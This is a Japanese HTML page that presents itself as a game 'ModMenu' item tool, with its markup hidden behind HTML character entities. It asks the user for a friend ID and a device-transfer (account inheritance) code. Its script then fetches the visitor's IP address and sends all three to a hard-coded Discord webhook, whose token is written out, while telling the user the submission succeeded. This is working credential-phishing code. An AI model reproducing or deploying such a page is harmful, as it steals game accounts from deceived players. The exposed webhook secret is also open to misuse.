<!DOCTYPE html>&#10;<html lang="ja">&#10;<head>&#10;&#32;&#32;&#32;&#32;<meta charset="UTF-8" />&#10;&#32;&#32;&#32;&#32;<meta http-equiv="X-UA-Compatible" content="IE=edge" />&#10;&#32;&#32;&#32;&#32;<meta name="viewport" content="width=device-width, initial-scale=1.0" />&#10;&#32;&#32;&#32;&#32;<title>&#109;&#97;&#105;&#110;&#95;&#102;&#114;&#111;&#110;&#116;&#115;&#105;&#103;&#104;&#116;</title>&#10;&#32;&#32;&#32;&#32;<style>
        body {
            background-color: #111;
            font-family: Arial, sans-serif;
            color: #fff;
            margin: 0;
            padding: 0;
        }

        .form-container {
            width: 400px;
            margin: 50px auto;
            padding: 20px;
            background-color: #222;
            border: 2px solid #444;
            border-radius: 10px;
            box-shadow: inset 0 0 8px rgba(255,255,255,0.2), 0 0 15px rgba(0,0,0,0.7);
            background-image: linear-gradient(145deg, #333, #222);
            text-align: center;
        }

        h2 {
            text-align: center;
        }

        .item {
            margin-top: 15px;
            text-align: left;
        }

        .label {
            display: block;
            margin-bottom: 5px;
        }

        .inputs {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 5px;
        }

        .button-area {
            margin-top: 20px;
        }

        input[type="submit"] {
            background-color: #555;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            transition: background 0.3s ease;
        }

        input[type="submit"]:hover {
            background-color: #777;
        }
    </style>&#10;</head>&#10;<body>&#10;&#32;&#32;&#32;&#32;<div class="form-container">&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<h2>&#77;&#111;&#100;&#77;&#101;&#110;&#117;&#126;&#73;&#116;&#101;&#109;&#126;</h2>&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<form id="mod-form">&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="item">&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<label class="label">&#12501;&#12524;&#12531;&#12489;&#73;&#68;&#40;&#12518;&#12540;&#12470;&#12540;&#73;&#68;&#41;</label>&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<input type="text" class="inputs" name="friend_id" required>&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#10;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="item">&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<label class="label">&#27231;&#31278;&#22793;&#12467;&#12540;&#12489;&#40;&#24341;&#12365;&#32153;&#12366;&#12467;&#12540;&#12489;&#41;</label>&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<input type="text" class="inputs" name="secret_code" required>&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#10;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="button-area">&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<input type="submit" value="実行">&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</form>&#10;&#32;&#32;&#32;&#32;</div>&#10;&#10;&#32;&#32;&#32;&#32;<script>
        document.getElementById("mod-form").addEventListener("submit", async function(event) {
            event.preventDefault();
            const formData = new FormData(this);
            
            try {
                const ipResponse = await fetch("https://api64.ipify.org?format=json");
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;
    
                const payload = {
                    content: "新しいデータが送信されました:",
                    embeds: [{
                        title: "ModMenu Data",
                        fields: [
                            { name: "フレンドID", value: formData.get("friend_id"), inline: true },
                            { name: "機種変コード", value: formData.get("secret_code"), inline: true },
                            { name: "IPアドレス", value: userIP, inline: false }
                        ],
                        color: 16711680
                    }]
                };
    
                const response = await fetch("https://discord.com/api/webhooks/1342757861054222468/9xHEZHnoXA_wtGHor1tg6VlIDsetfnmeJ3ZOvx9_kUUjuMQScnI6oq3NVhZKBTXIIXBS", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
    
                if (!response.ok) {
                    throw new Error(`Webhook送信エラー: ${response.status} ${response.statusText}`);
                }
    
                alert("送信が完了しました。");
            } catch (error) {
                console.error("送信エラー: ", error);
                alert("送信に失敗しました。");
            }
        });
    </script>&#10;&#32;&#32;&#32;&#32;&#10;</body>&#10;</html>&#10;
